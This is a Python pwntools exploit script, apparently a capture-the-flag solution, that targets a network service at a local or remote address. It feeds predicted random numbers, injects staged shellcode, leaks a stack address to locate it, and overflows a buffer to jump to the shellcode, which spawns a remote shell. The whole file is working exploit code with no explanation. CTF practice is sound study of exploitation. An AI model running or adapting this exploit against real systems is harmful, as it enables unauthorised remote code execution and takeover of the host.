from sys import argv
from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
if len(argv) == 2 and argv[1] == 'remote':
    host = '35.201.132.60'
    port = 12001
r = remote(host, port)

# generate numbers
rand_nums = [
    183,
    86,
    177,
    115,
    193,
    135,
    186,
    92,
    49,
    21,
    162,
    27,
    90,
    59,
    163,
    126
]

sc = shellcraft.linux.read(0, 'rsi', 34) + '    addq rsi, 0x1\n    jmp rsi'
asm_sc = asm(sc)

input('debug')

r.recvuntil(':')
for i in range(14):
    r.sendline(str(rand_nums[i]))
r.send(b'8' + asm_sc[:3+4])

# input('debug')

r.recvuntil(asm_sc[:3+4])
stack = u64(r.recvuntil(' ')[:-1].ljust(8, b'\x00'))
print('stack   =', hex(stack))
sc_addr = stack + (0x7fffb9e5cab0 - 0x7fffb9e5cac0) - 7
print('sc_addr =', hex(sc_addr))

# # get overflow offset
# input('debug')
# r.recvuntil(':')
# r.sendline(cyclic(0x18))

r.recvuntil(':')
payload = asm_sc[3:]
payload += p64(sc_addr)
payload += asm(shellcraft.linux.sh())

print(len(payload))
input('debug')
r.send(payload)
# r.send(asm(shellcraft.linux.sh()))

r.interactive()
